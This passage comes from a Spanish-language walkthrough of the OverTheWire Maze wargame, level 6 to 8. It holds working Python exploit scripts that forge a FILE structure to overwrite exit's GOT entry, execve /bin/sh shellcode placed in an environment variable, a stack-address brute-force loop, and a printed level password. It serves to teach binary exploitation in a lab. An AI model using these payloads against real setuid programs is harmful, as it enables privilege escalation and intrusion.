warning: ~/.gdbinit.local: No such file or directory
<span class=code-dark-red>gdb$</span> source /usr/local/peda/peda.py
<span class=code-dark-red>gdb-peda$</span> disassemble main
Dump of assembler code for function main:
   0x0804855b &lt;+0&gt;:     push   ebp
   0x0804855c &lt;+1&gt;:     mov    ebp,esp
   0x0804855e &lt;+3&gt;:     sub    esp,0x104
   ...
   0x08048606 &lt;+171&gt;:   call   0x8048420 &lt;fprintf@plt&gt;
   0x0804860b &lt;+176&gt;:   add    esp,0x10
   0x0804860e &lt;+179&gt;:   push   0x0
   0x08048610 &lt;+181&gt;:   call   0x80483f0 &lt;exit@plt&gt;
<span class=code-dark-red>gdb-peda$</span> break main
Breakpoint 1 at 0x8048564: file maze6.c, line 29.
<span class=code-dark-red>gdb-peda$</span> break *0x8048606
Breakpoint 2 at 0x8048606: file maze6.c, line 40.
<span class=code-dark-red>gdb-peda$</span> disassemble 0x80483f0
Dump of assembler code for function exit@plt:
   0x080483f0 &lt;+0&gt;:     jmp    DWORD PTR ds:0x80498dc
   0x080483f6 &lt;+6&gt;:     push   0x18
   0x080483fb &lt;+11&gt;:    jmp    0x80483b0
End of assembler dump.
<span class=code-dark-red>gdb-peda$</span> run asdf.txt AAAA
Starting program: /maze/maze6 asdf.txt AAAA
...
Breakpoint 1, main (argc=0x3, argv=0xffffd644) at maze6.c:29
29      maze6.c: No such file or directory.
<span class=code-dark-red>gdb-peda$</span> find TEST
Searching for 'TEST' in: None ranges
Found 2 results, display max 2 items:
   libc : <span class=code-dark-green>0xf7f6fd88</span> ("TEST")
[stack] : <span class=code-dark-blue>0xffffde29</span> ("TEST=", '\220' &lt;repeats 20 times&gt;, "\061\311j\vXQh//shh/bin\211\343\061\322̀")  
</code></pre></div><p>Desde la salida anterior de GDB, vemos la dirección de <code>exit</code> en la GOT y la dirección de <code>TEST</code> en la pila. Ahora actualizamos estos valores en el <em>exploit</em> de esta forma:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>import</span> <span class="mtk8 mtku">os</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">struct</span>

<span class=mtk1>exit_got</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>080498dc</span>
<span class=mtk1>env_addr</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>ffffde29</span>
<span class=mtk1>file_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>ffffd3a8</span>
<span class=mtk1>length</span>    <span class=mtk5>=</span> <span class=mtk6>256</span>

<span class=mtk1>p32</span> <span class=mtk5>=</span> <span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">h</span><span class=mtk1>:</span> <span class="mtk8 mtku">struct</span><span class=mtk1>.</span><span class=mtk8>pack</span><span class=mtk1>(</span><span class=mtk4>'&lt;I'</span><span class=mtk1>,</span> <span class="mtk9 mtki">h</span><span class=mtk1>)</span>

<span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>env_addr</span> <span class=mtk5>+</span> <span class=mtk6>5</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>28</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>exit_got</span> <span class=mtk5>-</span> <span class=mtk6>3</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>exit_got</span> <span class=mtk5>+</span> <span class=mtk6>5</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>16</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>f7fc5cc0</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>16</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>0804a0a0</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xff</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>64</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>f7fc3960</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class=mtk1>length</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>))</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>file_addr</span><span class=mtk1>)</span>

<span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class="mtk8 mtku">bytes</span><span class=mtk1>(</span><span class=mtk6>42</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class=mtk1>payload</span><span class=mtk1>))</span>  
</code></pre></div><p>La dirección de la estructura <code>FILE</code> ha cambiado, lo cual puede ser comprobado con GDB. Nótese que estamos escribiendo en <code>exit_got</code> porque <code>" : "</code> también se escribirá. De esta manera, podemos escribir 4 bytes desde <code>exit_got</code> hasta <code>exit_got + 4</code>. Además, la dirección que estamos escribiendo es <code>env_addr + 5</code> porque el contenido comienza en el quinto carácter (<code>TEST=...</code>), aunque hay algunas instrucciones <code>nop</code> como relleno por si acaso.</p><p>Ahora si lanzamos el <em>exploit</em> vemos que todo está correcto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> run asdf.txt "$(python3 maze6.py)"
Starting program: /maze/maze6 asdf.txt "$(python3 maze6.py)"
<span class=code-dark-blue>[----------------------------------registers-----------------------------------]</span>
<span class=code-dark-green>EAX</span>: <span class=code-dark-blue>0xffffd69d</span> ("asdf.txt")
<span class=code-dark-green>EBX</span>: 0x0
<span class=code-dark-green>ECX</span>: <span class=code-dark-blue>0xffffd4a8</span> --&gt; 0x0
<span class=code-dark-green>EDX</span>: <span class=code-dark-blue>0xffffd3a4</span> --&gt; <span class=code-dark-blue>0xffffde2e</span> --&gt; 0x90909090
<span class=code-dark-green>ESI</span>: 0x3
<span class=code-dark-green>EDI</span>: <span class=code-dark-blue>0xf7fc5000</span> --&gt; 0x1b2db0
<span class=code-dark-green>EBP</span>: <span class=code-dark-blue>0xffffd4a8</span> --&gt; 0x0
<span class=code-dark-green>ESP</span>: <span class=code-dark-blue>0xffffd394</span> --&gt; <span class=code-dark-blue>0xffffd3a8</span> --&gt; 0x0
<span class=code-dark-green>EIP</span>: <span class=code-dark-red>0x8048606</span> (&lt;main+171&gt;:     call   0x8048420 &lt;fprintf@plt&gt;)
<span class=code-dark-green>EFLAGS</span>: 0x286 (<span class=code-dark-green>carry</span> <span class=code-red>PARITY</span> <span class=code-dark-green>adjust</span> <span class=code-dark-green>zero</span> <span class=code-red>SIGN</span> <span class=code-dark-green>trap</span> <span class=code-red>INTERRUPT</span> <span class=code-dark-green>direction</span> <span class=code-dark-green>overflow</span>)
<span class=code-dark-blue>[-------------------------------------code-------------------------------------]</span>
   0x80485fd &lt;main+162&gt;:        push   eax
   0x80485fe &lt;main+163&gt;:        push   0x80486bf
   0x8048603 &lt;main+168&gt;:        push   DWORD PTR [ebp-0x4]
=&gt; 0x8048606 &lt;main+171&gt;:        <span class=code-green>call   0x8048420 &lt;fprintf@plt&gt;</span>
   0x804860b &lt;main+176&gt;:        add    esp,0x10
   0x804860e &lt;main+179&gt;:        push   0x0
   0x8048610 &lt;main+181&gt;:        <span class=code-dark-green>call   0x80483f0 &lt;exit@plt&gt;</span>
   0x8048615:   xchg   ax,ax
Guessed arguments:
arg[0]: <span class=code-dark-blue>0xffffd3a8</span> --&gt; 0x0
arg[1]: <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
arg[2]: <span class=code-dark-blue>0xffffd69d</span> ("asdf.txt")
arg[3]: <span class=code-dark-blue>0xffffd3a4</span> --&gt; <span class=code-dark-blue>0xffffde2e</span> --&gt; 0x90909090
<span class=code-dark-blue>[------------------------------------stack-------------------------------------]</span>
0000| <span class=code-dark-blue>0xffffd394</span> --&gt; <span class=code-dark-blue>0xffffd3a8</span> --&gt; 0x0
0004| <span class=code-dark-blue>0xffffd398</span> --&gt; <span class=code-dark-green>0x80486bf</span> ("%s : %s\n")
0008| <span class=code-dark-blue>0xffffd39c</span> --&gt; <span class=code-dark-blue>0xffffd69d</span> ("asdf.txt")
0012| <span class=code-dark-blue>0xffffd3a0</span> --&gt; <span class=code-dark-blue>0xffffd3a4</span> --&gt; <span class=code-dark-blue>0xffffde2e</span> --&gt; 0x90909090
0016| <span class=code-dark-blue>0xffffd3a4</span> --&gt; <span class=code-dark-blue>0xffffde2e</span> --&gt; 0x90909090
0020| <span class=code-dark-blue>0xffffd3a8</span> --&gt; 0x0
0024| <span class=code-dark-blue>0xffffd3ac</span> --&gt; 0x0
0028| <span class=code-dark-blue>0xffffd3b0</span> --&gt; 0x0
<span class=code-dark-blue>[------------------------------------------------------------------------------]</span>
Legend: <span class=code-dark-red>code</span>, <span class=code-dark-blue>data</span>, <span class=code-dark-green>rodata</span>, value

Breakpoint 2, 0x08048606 in main (argc=0x3, argv=0xffffd544) at maze6.c:40
40      in maze6.c
<span class=code-dark-red>gdb-peda$</span> p *((FILE*) 0xffffd3a8)
$2 = {
  _flags = 0x0,
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x80498d9 "\224\351\367\366\203\004\bP\n\351\367\220\241\342\367&\204\004\b\240\377\346", &lt;incomplete sequence \367&gt;,  
  _IO_buf_end = 0x80498e1 "\n\351\367\220\241\342\367&\204\004\b\240\377\346", &lt;incomplete sequence \367&gt;,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0xf7fc5cc0 &lt;_IO_2_1_stderr_&gt;,
  _fileno = 0x0,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = 0x804a0a0,
  _offset = 0xffffffffffffffff,
  __pad1 = 0x0,
  __pad2 = 0x0,
  __pad3 = 0x0,
  __pad4 = 0x0,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\000' &lt;repeats 39 times&gt;
}
</code></pre></div><p>Y a propósito, si continuamos, obtendremos una <em>shell</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>gdb-peda$</span> continue
Continuing.
asdf.txtprocess 697 is executing new program: /bin/dash  
Warning:
Cannot insert breakpoint 2.
Cannot access memory at address 0x8048606
</code></pre></div><p>Ahora el problema es que tenemos que lanzar el <em>exploit</em> sin el depurados. Esto es problemático porque no sabemos de antemano la dirección de la variable de entorno ni la dirección donde se almacenará la estructura <code>FILE</code> en la pila.</p><p>La dirección de la variable de entorno puede obtenerse utilizando este código:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;stdlib.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;string.h&gt;</span>

<span class="mtk7 mtki">void</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>**</span> <span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>ptr;</span>
  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>&lt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Usage:</span> <span class=mtk6>%s</span> <span class=mtk4>&lt;environment</span> <span class=mtk4>variable&gt;</span> <span class=mtk4>&lt;target</span> <span class=mtk4>program</span> <span class=mtk4>name&gt;</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>argv[</span><span class=mtk6>0</span><span class=mtk1>]);</span>  
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>ptr</span> <span class=mtk5>=</span> <span class=mtk8>getenv</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>]);</span> <span class=mtk3>/*</span> <span class=mtk3>get</span> <span class=mtk3>env</span> <span class=mtk3>var</span> <span class=mtk3>location</span> <span class=mtk3>*/</span>
  <span class=mtk1>ptr</span> <span class=mtk5>+=</span> <span class=mtk1>(</span><span class=mtk8>strlen</span><span class=mtk1>(argv[</span><span class=mtk6>0</span><span class=mtk1>])</span> <span class=mtk5>-</span> <span class=mtk8>strlen</span><span class=mtk1>(argv[</span><span class=mtk6>2</span><span class=mtk1>]))</span> <span class=mtk5>*</span> <span class=mtk6>2</span><span class=mtk1>;</span> <span class=mtk3>/*</span> <span class=mtk3>adjust</span> <span class=mtk3>for</span> <span class=mtk3>program</span> <span class=mtk3>name</span> <span class=mtk3>*/</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%s</span> <span class=mtk4>will</span> <span class=mtk4>be</span> <span class=mtk4>at</span> <span class=mtk6>%p\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk1>ptr);</span>
<span class=mtk1>}</span>
</code></pre></div><p>Básicamente, imprime la dirección de una cierta variable de entorno si le indicamos también la ruta de ejecución del binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ gcc -m32 -o envaddr envaddr.c
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ export TEST=$(python -c 'print("\x90" * 20 + "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\xcd\x80")')  
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ ./envaddr TEST /maze/maze6
TEST will be at 0xffffde35
</code></pre></div><p>Y luego, para el problema de la dirección en la pila, podemos hacer fuerza bruta hasta que consigamos la <em>shell</em>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>import</span> <span class="mtk8 mtku">os</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">struct</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">sys</span>

<span class=mtk1>exit_got</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>080498dc</span>
<span class=mtk1>env_addr</span>  <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>ffffde35</span>
<span class=mtk1>file_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>ffffd000</span> <span class=mtk5>+</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>])</span>
<span class=mtk1>length</span>    <span class=mtk5>=</span> <span class=mtk6>256</span>

<span class=mtk1>p32</span> <span class=mtk5>=</span> <span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">h</span><span class=mtk1>:</span> <span class="mtk8 mtku">struct</span><span class=mtk1>.</span><span class=mtk8>pack</span><span class=mtk1>(</span><span class=mtk4>'&lt;I'</span><span class=mtk1>,</span> <span class="mtk9 mtki">h</span><span class=mtk1>)</span>

<span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>env_addr</span> <span class=mtk5>+</span> <span class=mtk6>10</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>28</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>exit_got</span> <span class=mtk5>-</span> <span class=mtk6>3</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>exit_got</span> <span class=mtk5>+</span> <span class=mtk6>5</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>16</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>f7fc5cc0</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>16</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>0804a0a0</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xff</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>64</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>f7fc3960</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class=mtk1>length</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>))</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32</span><span class=mtk1>(</span><span class=mtk1>file_addr</span><span class=mtk1>)</span>

<span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class="mtk8 mtku">bytes</span><span class=mtk1>(</span><span class=mtk6>42</span> <span class=mtk5>^</span> <span class=mtk1>b</span> <span class=mtk5>for</span> <span class=mtk1>b</span> <span class=mtk5>in</span> <span class=mtk1>payload</span><span class=mtk1>))</span>  
</code></pre></div><p>Empezaremos desde <code>0xffffd000</code> hasta <code>0xffffe000</code> (que es el espacio disponible en la pila) en pasos de 4. Habrá valores en los que la pila se para. Si esto ocurre, cancelamos el bucle y continuamos en la siguiente iteración:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ for i in `seq 0 4 4095`; do echo $i; /maze/maze6 asdf.txt "$(python3 maze6.py $i)"; done  
0
^C
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ for i in `seq 4 4 4095`; do echo $i; /maze/maze6 asdf.txt "$(python3 maze6.py $i)"; done
4
^C
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ for i in `seq 8 4 4095`; do echo $i; /maze/maze6 asdf.txt "$(python3 maze6.py $i)"; done
8
Segmentation fault
12
16
^C
</code></pre></div><p>Finalmente, vemos que 952 es el valor correcto y conseguimos una <em>shell</em> como <code>maze7</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ for i in `seq 840 4 4095`; do echo $i; /maze/maze6 asdf.txt "$(python3 maze6.py $i)"; done  
840
Segmentation fault
844
^C
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ for i in `seq 848 4 4095`; do echo $i; /maze/maze6 asdf.txt "$(python3 maze6.py $i)"; done
848
Fatal error: glibc detected an invalid stdio handle
Aborted
...
944
Fatal error: glibc detected an invalid stdio handle
Aborted
948
952
asdf.txt$
$
$ whoami
maze7
</code></pre></div><p>Y funciona perfectamente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ /maze/maze6 asdf.txt "$(python3 maze6.py 952)"  
asdf.txt$
$ whoami
maze7
$ cat /etc/maze_pass/maze7
iuvaegoang
</code></pre></div><h2 id=nivel-7---8>Nivel 7 -> 8</h2><p>Tenemos otro binario que comprueba el contenido de un archivo dado:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>__fd;</span>
  <span class=mtk1>Elf32_Ehdr</span> <span class=mtk1>ehdr;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>fd;</span>

  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>&lt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"usage:</span> <span class=mtk6>%s</span> <span class=mtk4>file</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>*</span><span class=mtk1>argv);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>__fd</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(__fd</span> <span class=mtk5>&lt;</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"cannot</span> <span class=mtk4>open</span> <span class=mtk4>file</span> <span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>]);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>read</span><span class=mtk1>(__fd,</span> <span class=mtk5>&amp;</span><span class=mtk1>ehdr,</span> <span class=mtk6>52</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Dumping</span> <span class=mtk4>section-headers</span> <span class=mtk4>of</span> <span class=mtk4>program</span> <span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>]);</span>
  <span class=mtk8>Print_Shdrs</span><span class=mtk1>(__fd, ehdr.e_shoff,</span> <span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>ehdr.e_shstrndx,</span> <span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>ehdr.e_shnum,</span> <span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>ehdr.e_shentsize);</span>  
  <span class=mtk8>close</span><span class=mtk1>(__fd);</span>
  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>Print_Shdrs</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">fd</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">offset</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">shstrndx</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">num</span><span class=mtk1>,</span> <span class="mtk7 mtki">size_t</span> <span class="mtk9 mtki">size</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>__buf;</span>
  <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>__buf_00;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>sdata[</span><span class=mtk6>40</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>strs;</span>
  <span class=mtk1>Elf32_Shdr</span> <span class=mtk5>*</span><span class=mtk1>shdr;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>strdata;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>

  <span class=mtk8>lseek</span><span class=mtk1>(fd, offset,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk1>__buf</span> <span class=mtk5>=</span> <span class=mtk8>malloc</span><span class=mtk1>(num</span> <span class=mtk5>*</span> <span class=mtk6>40</span><span class=mtk1>);</span>
  <span class=mtk8>read</span><span class=mtk1>(fd, __buf, num</span> <span class=mtk5>*</span> <span class=mtk6>40</span><span class=mtk1>);</span>
  <span class=mtk8>lseek</span><span class=mtk1>(fd,</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">__off_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">int</span><span class=mtk1>)</span> <span class=mtk1>__buf</span> <span class=mtk5>+</span> <span class=mtk1>shstrndx</span> <span class=mtk5>*</span> <span class=mtk6>40</span> <span class=mtk5>+</span> <span class=mtk6>16</span><span class=mtk1>),</span> <span class=mtk6>0</span><span class=mtk1>);</span>
